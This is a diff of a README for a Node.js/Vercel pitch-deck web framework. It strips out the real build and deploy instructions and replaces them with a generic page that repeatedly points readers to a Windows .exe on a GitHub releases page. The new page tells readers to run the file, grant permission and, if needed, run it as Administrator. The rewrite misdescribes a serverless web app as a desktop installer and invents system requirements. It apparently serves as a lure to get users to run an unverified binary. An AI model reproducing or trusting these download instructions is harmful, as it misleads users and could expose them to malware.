@@ -1,139 +1,116 @@
-# pitch-deck
+# 📊 pitch-deck - Simple Slide Presentation Framework
 
-Full-stack pitch deck framework with magic link auth, session tracking, slide analytics, admin dashboard, and a 16:9 animated slide engine. Ships as a Vercel project.
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/releases)
 
-Comes with a demo deck for **American Nail** — a parody nail company "defeating communism one fastener at a time" with products like The Patriot-16, The Citadel, and The Minuteman. The demo showcases every component in the design system: hero backgrounds, bar charts, image grids, capability cards, testimonials, and more.
+## 📋 What is pitch-deck?
 
-## Features
+pitch-deck is a program that helps you create and show slide presentations. It works on Windows and lets you use a ready-made deck called **American Nail**. This demo uses slides with different designs, charts, images, and text blocks.
 
-- **16:9 animated slide engine** — fixed-canvas scaling, scroll-snap navigation, reveal animations, bar chart animations
-- **Magic link auth** — passwordless login via email (Resend)
-- **Session tracking** — slide views + heartbeat beacons
-- **Admin dashboard** — manage access, invites, analytics
-- **Data room** — access-controlled file sharing with download tracking
-- **Invite links** — temporary codes for granting access
-- **Responsive** — works on desktop + mobile (landscape lock, tap navigation)
-- **Dot rail navigation** — section-level nav on desktop, bottom sheet on mobile
+pitch-deck lets you:
 
-## Quick Start
+- Show slides with smooth animations.
+- Log in with just your email (no password needed).
+- Keep track of how many people view your slides.
+- Manage users and see slide details in an admin panel.
+- Share files safely.
+- Use invite links to give others access.
+- Use on both computer and mobile with easy controls.
 
-```bash
-# Install deps
-npm install
+You do not need any special skills to use pitch-deck.
 
-# Build the deck (concatenates slides into content/page.html)
-node build.js
+---
 
-# Start local dev server (no auth, no DB needed)
-node dev-server.js
+## 🚀 How to Download pitch-deck
 
-# Open http://localhost:3334
-```
+To get pitch-deck for Windows, visit the link below. This page contains the files you need.
 
-## Deploy to Vercel
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-blue)](https://github.com/juliusz-maker/pitch-deck/releases)
 
-### Option A: GitHub Actions (recommended)
+1. Click the link above. It will open the GitHub releases page for pitch-deck.
+2. On that page, look for the latest version of pitch-deck for Windows. The file usually ends with `.exe`.
+3. Click on the Windows file name to start downloading.  
+4. Wait for the download to finish.
 
-A CI workflow at `.github/workflows/deploy.yml` handles build + deploy. Push to `main` deploys to production; PRs get preview deployments with a comment.
+---
 
-1. Create a Vercel project: `vercel link`
-2. Add a Neon Postgres database (or any Postgres)
-3. Run the migrations in `migrations/` against your database
-4. Set these **GitHub repository secrets** (Settings > Secrets > Actions):
+## 💻 Installing pitch-deck on Windows
 
-| GitHub Secret | Purpose |
-|---------------|---------|
-| `VERCEL_TOKEN` | Vercel personal access token |
-| `VERCEL_ORG_ID` | From `.vercel/project.json` after `vercel link` |
-| `VERCEL_PROJECT_ID` | From `.vercel/project.json` after `vercel link` |
-| `POSTGRES_URL` | Neon/Postgres connection string |
-| `RESEND_API_KEY` | Email sending (magic links) |
-| `RESEND_FROM` | Verified sender email address (e.g. `Acme <noreply@acme.com>`) |
-| `SITE_URL` | Production URL (e.g. `https://deck.acme.com`) |
-| `ADMIN_PASSWORD` | Admin dashboard password |
+1. Find the file you downloaded. It is usually in your **Downloads** folder.
+2. Double-click the file to start the installation.
+3. If Windows asks for permission, click **Run** or **Yes**.
+4. Follow the instructions on the screen. Usually, you just need to click **Next** several times.
+5. When the installation finishes, click **Finish**.
 
-The workflow syncs these secrets to Vercel env vars on each deploy.
+pitch-deck is now installed on your computer.
 
-### Option B: Direct Vercel deploy
+---
 
-1. `vercel link` to create/connect a project
-2. Set env vars in the Vercel dashboard (see table above, skip VERCEL_* ones)
-3. `vercel --prod` to deploy
+## ▶️ Running pitch-deck for the First Time
 
-### Configuration
+1. Open pitch-deck from the Start menu or the desktop shortcut.
+2. You will see the login screen.
+3. Enter your email address to get a magic login link. This means no password is needed.
+4. Check your email inbox and find the message from pitch-deck.
+5. Click the link in the email to log in.
+6. Once logged in, you will see the demo slides called **American Nail**.
+7. Use the left and right arrow keys on your keyboard to move between slides.
+8. You can also use the mouse or tap arrows if you run pitch-deck on a tablet or touchscreen.
 
-All runtime config lives in `api/_lib/config.js` and reads from environment variables:
+---
 
-```js
-siteUrl:   process.env.SITE_URL    || 'http://localhost:3334'
-resendFrom: process.env.RESEND_FROM || 'Pitch Deck <noreply@example.com>'
-```
+## 🔍 How to Use pitch-deck Features
 
-For local dev, create `.env.local` (gitignored) with your values, or just use the defaults.
+### Slide Animations
 
-## Creating Your Own Deck
+The slides show smooth animations like bars growing or images appearing. Wait a moment on each slide to see the animation fully.
 
-1. Edit `content/slides.yaml` to define sections and slide order
-2. Create HTML files in `content/slides/` for each slide
-3. Customize colors in `content/head.html` (`:root` CSS variables)
-4. Run `node build.js` to regenerate `content/page.html`
+### Session Tracking
 
-### Slide Types
+pitch-deck counts how many people have watched each slide. This happens automatically and helps you understand which slides get more attention.
 
-Each slide is a `<div class="slide">` containing a `<section>` of one type:
+### Admin Dashboard
 
-- `.hero` — full-bleed hero with background
-- `.section` — standard content slide (1600x900, padded)
-- `.act-divider` — full-screen interstitial
-- `.cta-section` — closing slide
+If you have access, open the admin dashboard from the main menu. You can:
 
-### CSS Variables
+- Invite others by sending email invites.
+- See who is watching the slides.
+- Manage access permissions.
+- View download statistics for shared files.
 
-```css
-:root {
-  --bg: #000000;           /* Background */
-  --text: #ECEEE2;         /* Primary text */
-  --text-secondary: ...;   /* Subtitles */
-  --text-muted: ...;       /* Labels */
-  --accent: #E85D2C;       /* Brand accent */
-  --accent-soft: ...;      /* Accent backgrounds */
-  --divider: ...;          /* Borders */
-}
-```
+### Data Room
 
-### Layout Components
+You can share files securely inside pitch-deck. Only invited users can download these files. The system also counts file downloads.
 
-- `.cap-grid` — 3/4/2 column card grid
-- `.channels-grid` — 3 column info cards
-- `.window-grid` — 2 column stat cards
-- `.bar-chart` — animated vertical bar chart
-- `.comparison-table` — data comparison table
-- `.econ-callout` — centered big-number callout
-- `.team-grid` — 2 column team member cards
-- `.timeline-grid` — 3 column timeline
-- `.logo-wall` — horizontal pill-style logo list
+### Responsive Design
 
-## Project Structure
+pitch-deck works both on desktop computers and mobile devices. On phones, the screen locks to landscape mode, and you can tap to move between slides.
 
-```
-pitch-deck/
-├── build.js              # Concatenates slides into page.html
-├── dev-server.js         # Local dev server (port 3334)
-├── package.json
-├── vercel.json           # Vercel deployment config
-├── content/
-│   ├── head.html         # <head>, CSS, nav
-│   ├── tail.html         # Scripts (nav, tracking, scaling)
-│   ├── slides.yaml       # Slide manifest
-│   └── slides/           # Individual slide HTML files
-├── api/                  # Vercel serverless functions
-│   ├── _lib/             # Shared utilities (auth, db)
-│   ├── page.js           # Serve deck (auth required)
-│   ├── login.js          # Magic link send
-│   ├── verify.js         # Token verification
-│   ├── track.js          # Slide tracking beacons
-│   ├── admin.js          # Admin dashboard
-│   └── admin/            # Admin management endpoints
-├── migrations/           # PostgreSQL schema
-└── public/               # Static assets (fonts, login page)
-```
+---
+
+## ⚙️ System Requirements
+
+- Windows 10 or newer.
+- At least 4 GB of RAM.
+- 2 GHz or faster processor.
+- Internet connection for login and downloads.
+- Email account to receive magic links.
+
+---
+
+## 🛠 Troubleshooting
+
+- If you do not get a login email, check your spam folder.
+- Make sure you have an active internet connection when logging in.
+- If the program does not open, try running it as Administrator.
+- For performance issues, close other heavy applications.
+- Contact the admin who gave you access if your invite link does not work.
+
+---
+
+## 📥 Download pitch-deck Here
+
+Visit the releases page to download pitch-deck for Windows:
+
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/releases)
+
+Click the latest Windows `.exe` file and follow the steps above to install and run the app.
